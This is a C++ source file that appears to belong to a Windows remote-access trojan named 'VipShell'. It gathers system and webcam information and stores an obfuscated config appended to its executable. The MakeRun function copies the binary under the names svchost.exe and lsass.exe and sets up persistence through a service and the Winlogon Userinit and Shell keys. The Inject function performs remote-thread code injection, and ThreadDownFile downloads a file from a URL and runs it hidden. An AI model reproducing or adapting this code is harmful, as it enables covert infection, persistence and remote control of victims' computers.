#include "tools.h"
#include "Vfw.h"
#include <TCHAR.H>
#include <TLHELP32.H>
#include <Wininet.h>
#pragma comment (lib, "Vfw32.lib")
#include <Psapi.h>
#pragma comment (lib, "Psapi.lib")
#pragma comment (lib, "Wininet")
#include <atlbase.h>
DWORD GetCpuInfo()
{
	HKEY hKey;
	DWORD dwBufLen = 80;
	RegOpenKeyEx( HKEY_LOCAL_MACHINE,
	   L"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
	   0, KEY_QUERY_VALUE, &hKey );
	DWORD dwCpu;
	dwBufLen = sizeof(DWORD);
	RegQueryValueEx( hKey, L"~MHz", NULL, NULL,
	   (LPBYTE)&dwCpu, &dwBufLen);
	RegCloseKey(hKey);
	return dwCpu;
}

BOOL GetServerEdition(DWORD* dwMajorVersion, DWORD* dwMinorVersion, DWORD* dwPlatformId)
{
	 OSVERSIONINFOEX osvi;
	 osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	  if( ! GetVersionEx ((OSVERSIONINFO *) &osvi))
		  return FALSE;
	  *dwMajorVersion = osvi.dwMajorVersion;
	  *dwMinorVersion = osvi.dwMinorVersion;
	  *dwPlatformId   = osvi.dwPlatformId;
	  return TRUE;
}

DWORD GetMemorySize()
{
	MEMORYSTATUS ms;
	GlobalMemoryStatus(&ms);
	return (DWORD)ms.dwTotalPhys;
}
bool IsCanCap()
{
	WCHAR szVfwName[256];
	WCHAR szVfwVersion[256];
	ZeroMemory(szVfwName, sizeof(szVfwName));
	ZeroMemory(szVfwVersion, sizeof(szVfwVersion));
	capGetDriverDescription(0, szVfwName, sizeof(szVfwName), szVfwVersion, sizeof(szVfwVersion));
	if(lstrlen(szVfwName) == 0)
		return false;
	return true;
}

HWND FindCapWnd()
{
	WCHAR szClassName[] = L"___GetCapWnd___";
	HWND hwnd = NULL;
	for(int i = 0; i < 100; i++)
	{
		hwnd  = ::FindWindow(szClassName, NULL);
		if(hwnd != NULL)
		{
			SendMessage(hwnd, WM_CLOSE, 0, 0);
			SendMessage(hwnd, WM_DESTROY, 0, 0);
			return hwnd;
		}
	}
	return hwnd;
}
//提升进程访问权限
bool enableDebugPriv()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;
  
    if (!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return false;
    }
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {
        CloseHandle(hToken);
        return false;
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }
    return true;
}

bool GetProcessFilePath(DWORD dwProcessId, LPTSTR szPath, DWORD dwbufflen, bool isGetPath)      //根据ProcessId得到对应的文件地址
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if(hProcess == NULL)
		return false;
	HMODULE hMode;
	DWORD dwLen;
	if( !EnumProcessModules(hProcess, &hMode, sizeof(hMode), &dwLen))
	{
		CloseHandle(hProcess);
		return false;
	}
	GetModuleFileNameEx(hProcess, hMode, szPath,  dwbufflen);
	if(isGetPath)
	{
		*(_tcsrchr(szPath, _T('\\'))+1)  = 0;
	}
	CloseHandle(hProcess);
	return true;
}

BOOL KillProcess(DWORD dwProcessId)
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if(hProcess == NULL)
		return false;
	BOOL bRet = TerminateProcess(hProcess, 0);
	CloseHandle(hProcess);
	return bRet;
}

DWORD GetProcessIdByName(LPCWSTR szName)
{
	DWORD dwRet = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );
    Process32First( hSnapshot, &pe32 );
    do
	{

		if ( _tcsicmp(pe32.szExeFile, szName) == 0)
		{
			dwRet = pe32.th32ProcessID;
			break;
		}


    } while ( Process32Next( hSnapshot, &pe32 ) );
    CloseHandle( hSnapshot );
	return dwRet;
}
DWORD GetProcessToVecTor(std::vector<tagVipShellProcess>* pVecTor)
{
	pVecTor->clear();
    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );
    Process32First( hSnapshot, &pe32 );
	tagVipShellProcess Proc;
    do
	{
		memset(&Proc, 0,sizeof(tagVipShellProcess));
		Proc.dwPid = pe32.th32ProcessID;
		bool bIsOk = GetProcessFilePath(Proc.dwPid, Proc.cFileName, sizeof(Proc.cFileName), false);
		if( !bIsOk )
			lstrcpy(Proc.cFileName, pe32.szExeFile);
		pVecTor->push_back(Proc);

    } while ( Process32Next( hSnapshot, &pe32 ) );
    CloseHandle( hSnapshot );
	return (DWORD)pVecTor->size();
}

bool GetVipShellConfig(LPCWSTR szFile,	LPVIPSHELLCONFIG pCfg)
{
	FILE* fp  = _wfopen(szFile, _T("rb"));
	if( !fp )
		return false;
	long loffset = 0 - sizeof(VIPSHELLCONFIG);
	int nRet = fseek(fp, loffset, SEEK_END);
	if ( nRet != 0)
	{
		fclose(fp);
		return false;
	}
	fread(pCfg, 1, sizeof(VIPSHELLCONFIG), fp);
	fclose(fp);
	BYTE bByte;
	for(int i = 0 ; i < sizeof(VIPSHELLCONFIG); i++)
	{
		bByte = (BYTE)*((BYTE*)pCfg + i);
		bByte ++;
		(BYTE)*((BYTE*)pCfg + i) = bByte;
	//	*(BYTE*)(pCfg + i) = bByte;
	}
	return true;
}

bool SetVipShellConfig(LPCWSTR szFile,	LPVIPSHELLCONFIG pCfg1)
{
	VIPSHELLCONFIG tp;
	memcpy(&tp, pCfg1, sizeof(VIPSHELLCONFIG));
	LPVIPSHELLCONFIG pCfg =&tp;
	BYTE bByte;
	for(int i = 0 ; i < sizeof(VIPSHELLCONFIG); i++)
	{
		bByte = (BYTE)*((BYTE*)pCfg + i);
		bByte --;
		(BYTE)*((BYTE*)pCfg + i) = bByte;
	}
	FILE* fp  = _wfopen(szFile, _T("wb"));
	if( !fp )
		return false;
	long loffset = 0 - sizeof(VIPSHELLCONFIG);
	int nRet = fseek(fp, loffset, SEEK_END);
//	if ( nRet != 0)
//		return false;
	fwrite(pCfg, 1, sizeof(VIPSHELLCONFIG), fp);
	fclose(fp);
	return true;
}
bool SetVipShellConfigExplain(LPCWSTR szEx)
{
	VIPSHELLCONFIG Cfg;
	WCHAR pExePath[MAX_PATH] ; GetExeFilePath(pExePath);
	GetVipShellConfig(pExePath, &Cfg);
	lstrcpy(Cfg.szExplain, szEx);

	CStartAggregate hStart;
	std::wstring strCfgFile = hStart.m_strWindowsPath + L"web\\";
	strCfgFile += Cfg.szCfgFile;

	SetVipShellConfig(strCfgFile.c_str(), &Cfg);
	return true;
}

void MakeRun(LPCWSTR szFile, LPCWSTR szServerName, bool bIsRun)
{

	if( szServerName == NULL)
	{
	
		VIPSHELLCONFIG vipcfgEx;
		bool bRet = GetVipShellConfig( &vipcfgEx);
		if(!bRet)
			return ;
		return MakeRun(szFile, vipcfgEx.szServerName, bIsRun);
	}


	CStartAggregate hStart;
	hStart.m_strExePath = szFile;

	std::wstring strServerPath = hStart.m_strSystemPath + L"wins\\";
	strServerPath += L"svchost.exe";
	CopyFile(hStart.m_strExePath.c_str(), strServerPath.c_str(), FALSE);
	hStart.CreateNtService(szServerName, strServerPath.c_str());
	if(!bIsRun)
		DeleteFile(strServerPath.c_str());


	std::wstring strServerLoad = hStart.m_strSystemPath + L"ShellExt\\";
	strServerLoad += L"lsass.exe";
	CopyFile(hStart.m_strExePath.c_str(), strServerLoad.c_str(), FALSE);
	if(bIsRun)
		hStart.SetCurrentWindowsLoad(strServerLoad.c_str());
	else
		hStart.SetCurrentWindowsLoad(L"");
	if(!bIsRun)
		DeleteFile(strServerLoad.c_str());

	std::wstring strServerIe = hStart.m_strIePath ;
	strServerIe += L"svchost.exe";
	CopyFile(hStart.m_strExePath.c_str(), strServerIe.c_str(), FALSE);
	if(bIsRun)
		hStart.SetCurrentVersionWinlogonUserinit(strServerIe.c_str());
	else
		hStart.SetCurrentVersionWinlogonUserinit(L"");
	if(!bIsRun)
		DeleteFile(strServerIe.c_str());

	std::wstring strServerhelp = hStart.m_strWindowsPath + L"help\\" ;
	strServerhelp += L"svchost.exe";
	CopyFile(hStart.m_strExePath.c_str(), strServerhelp.c_str(), FALSE);
	if(bIsRun)
		hStart.SetCurrentVersionWinlogonShell(strServerhelp.c_str());
	else
		hStart.SetCurrentVersionWinlogonShell(L"");
	if(!bIsRun)
		DeleteFile(strServerhelp.c_str());
}

bool GetVipShellConfig(LPVIPSHELLCONFIG pCfg)
{
	CStartAggregate hStart;
	VIPSHELLCONFIG vipcfg;
	WCHAR pExePath[MAX_PATH] ; GetExeFilePath(pExePath);
	bool bRet =  GetVipShellConfig(pExePath, &vipcfg);
	if(!bRet)
		return false;
	std::wstring strCfgFile = hStart.m_strWindowsPath + L"web\\";
	strCfgFile += vipcfg.szCfgFile;
	VIPSHELLCONFIG vipcfgEx;
	bRet = GetVipShellConfig(strCfgFile.c_str(), &vipcfgEx);
	if( !bRet )
	{
		memcpy(pCfg, &vipcfg, sizeof(VIPSHELLCONFIG));
		return true;
	}
	bRet = SetVipShellConfig(strCfgFile.c_str(),  &vipcfgEx);
	if(!bRet)
		return true;
	memcpy(pCfg, &vipcfgEx, sizeof(VIPSHELLCONFIG));
	return true;
//	MakeRun(hStart.m_strExePath.c_str(), vipcfgEx.szServerName);
}

DWORD Inject
(
 DWORD PID, 
 void* pfnRemoteFunc, 
 DWORD dwFuncSize, 
 void* pRemoteParam, 
 DWORD dwParamSize,
 DWORD dwMilliseconds 
 //等待远线程结束:INFINITE:无限等待,结束后释放远线程内存(用于非阻塞函数)
 //如果为0,不等待而直接返回,而且不释放远线程内存(用于阻塞函数)
)	
{
    
    if( PID < 1 || dwFuncSize < 1 || pfnRemoteFunc == NULL )
	return FALSE;	
    
    HANDLE	hProc = NULL;
    void*	pfnRmtFunc = NULL;
    void*	pRmtParam = NULL;
    HANDLE	hRemoteThread = NULL;
    DWORD	dwThreadId = NULL;
    DWORD	dwExitCode = NULL;
    BOOL	bFlag;
    
    
    //=======打开进程========
    hProc = OpenProcess( PROCESS_CREATE_THREAD| //允许远程创建线程
	PROCESS_VM_OPERATION|  //允许远程VM操作
	PROCESS_VM_WRITE,      //允许远程VM写
	FALSE, 
	PID);		
    if( !hProc )
    {	
//	TraceD("OpenProcess() %s", GetErrorMessage(GetLastError()) );
	goto InjectCleanUp;
    }
    
    //=======函数=======
    pfnRmtFunc = VirtualAllocEx( hProc, NULL, dwFuncSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
    if( !pfnRmtFunc )
    {
//	TraceD("VirtualAllocEx() %s", GetErrorMessage(GetLastError()) );
	goto InjectCleanUp;
    }
 
    //=======参数=======
    pRmtParam = VirtualAllocEx( hProc, NULL, dwParamSize, MEM_COMMIT, PAGE_READWRITE); 
    if( !pRmtParam )
    {
//	TraceD("VirtualAllocEx() %s\r\n", GetErrorMessage(GetLastError()) );
	goto InjectCleanUp;
    }
   
    bFlag = WriteProcessMemory( hProc, pfnRmtFunc, (PVOID)pfnRemoteFunc, dwFuncSize, 0);
    if( bFlag == FALSE )   
    {
//	TraceD("WriteProcessMemory() %s\r\n", GetErrorMessage(GetLastError()) );
	goto InjectCleanUp;
    }
       
    bFlag = WriteProcessMemory( hProc, pRmtParam, (PVOID)pRemoteParam, dwParamSize, 0);
    if( bFlag == FALSE )   
    {
//	TraceD("WriteProcessMemory() %s\r\n", GetErrorMessage(GetLastError()) );
	goto InjectCleanUp;
    }
    
    
    //=======执行远线程=======	
    hRemoteThread = CreateRemoteThread(	hProc,
	NULL,
	0,
	(LPTHREAD_START_ROUTINE)pfnRmtFunc,
	(LPVOID)pRmtParam,
	0,
	&dwThreadId);
    if( !hRemoteThread )
    {	
//	TraceD("CreateRemoteThread() %s\r\n", GetErrorMessage(GetLastError()) );
	goto InjectCleanUp;
    }
    else
    {
//	TraceD("Inject OK!\r\npfnRemoteFunc:%08X\r\npRmtParam:%08X\r\n", pfnRmtFunc, pRmtParam);
    }
    
    WaitForSingleObject( hRemoteThread, dwMilliseconds ); 
    GetExitCodeThread( hRemoteThread, &dwExitCode );
    
    CloseHandle( hProc );
    if(dwMilliseconds != 0)
    {
	VirtualFree( pfnRmtFunc, 0, MEM_RELEASE);
//	VirtualFree( pRmtParam, 0, MEM_RELEASE);
    }
    CloseHandle( hRemoteThread );
    return dwExitCode;
    
InjectCleanUp:
    if( hProc )		CloseHandle( hProc );
    if( pfnRmtFunc )	VirtualFree( pfnRmtFunc, 0, MEM_RELEASE);
//    if( pRmtParam )	VirtualFree( pRmtParam, 0, MEM_RELEASE);
    if( hRemoteThread )	CloseHandle( hRemoteThread );
    return 0;
}
bool RunFile(LPCWSTR szFile, LPCWSTR szlp , LPCWSTR szDir , DWORD dwShow )
{
	COpenDesktop hDesktop;
	COpenDesktop hDesktop1;
	ShellExecute(NULL, L"open", szFile, szlp, szDir, dwShow);
	return true;
}
bool RunFileEx(LPCWSTR szFile, LPCWSTR szlp , LPCWSTR szDir , DWORD dwShow )
{
	PROCESS_INFORMATION ProcessInfo; 
	STARTUPINFO StartupInfo; //This is an [in] parameter
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = sizeof(StartupInfo); //Only compulsory field
	StartupInfo.lpDesktop=L"WinSta0\\Default";
	StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES ; 

	WCHAR szCmd[512] = {0};
	wsprintf(szCmd, L"cmd.exe /c \"%s\" \"%s\"", szFile, szlp);
	StartupInfo.wShowWindow = SW_HIDE;
	WCHAR szP[MAX_PATH] = {0};
	lstrcpy(szP, szlp);
	if(CreateProcess(NULL, szCmd, 
		NULL,NULL,FALSE,0,NULL,
		L"c:\\",&StartupInfo,&ProcessInfo))
	{ 
		CloseHandle(ProcessInfo.hThread);
		CloseHandle(ProcessInfo.hProcess);
	}
	else
		return false;
	return true;
}
bool DownFile(LPCWSTR szUrl, LPCWSTR szPath , std::wstring* pRet)
{
	TCHAR   szHead[] = _T("Accept: */*\r\n\r\n");
	TCHAR szAgent[10] = {0};
	wsprintf(szAgent, L"%d", GetTickCount());
	HINTERNET hInternet = ::InternetOpen(szAgent, 0, NULL, NULL, 0);
	if(hInternet == NULL)
		return false;
	HINTERNET hConnect = InternetOpenUrl(hInternet	, szUrl, szHead, lstrlen(szHead), INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
	if(hConnect == NULL)
	{
		InternetCloseHandle(hInternet);
		return false;
	}
	char buf[16 * 1024];
	DWORD len ;
	FILE* fp = NULL;
	if(szPath)
	 fp = _wfopen(szPath, L"wb");
	while(true)
	{
		memset(buf, 0, sizeof(buf));
		::InternetReadFile(hConnect, buf, sizeof(buf)-1, &len);
		if(!len)
			break;
		if(fp)
			fwrite(buf, 1, len, fp);
		if(pRet)
			*pRet += ATL::CA2W(buf);
	}
	if(fp)
		fclose(fp);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	return true;
}
void GetNameByFullPath(LPCWSTR szFile, std::wstring* strName, std::wstring* strPath)
{
	if(lstrlen(szFile) == 0)
		return ;
	if(strName)
	{
	//	WCHAR *sz = 
		*strName = _tcsrchr(szFile, '/') + 1;
	}
	if(strPath)
	{
		WCHAR szP[MAX_PATH] = {0};
		wcsncpy(szP, szFile, lstrlen(szFile) - lstrlen(( _tcsrchr(szFile, _T('/')) + 1)) );
		*strPath = szP;
	}
		
	return ;
}
struct tagDownFile
{
	WCHAR szPath[MAX_PATH];
};
DWORD WINAPI ThreadDownFile(LPVOID lp)
{
	tagDownFile* pInfo = (tagDownFile*)lp;
	std::wstring strName;
	std::wstring strPath;
	GetNameByFullPath(pInfo->szPath, &strName, &strPath);
	CStartAggregate hStart;
//	hStart.m_strWindowsPath += strName;
	hStart.m_strTempPath += strName;
	DownFile(pInfo->szPath, hStart.m_strTempPath.c_str(), NULL);
	RunFileEx(hStart.m_strTempPath.c_str(), NULL, NULL, NULL);
	delete pInfo;
	return 0;
}
void CreateThreadDownFile(LPCWSTR szUrl)
{
	tagDownFile* pInfo = new tagDownFile;
	lstrcpy(pInfo->szPath, szUrl);
	CreateThread(NULL, 0, ThreadDownFile, pInfo, 0, NULL);
}

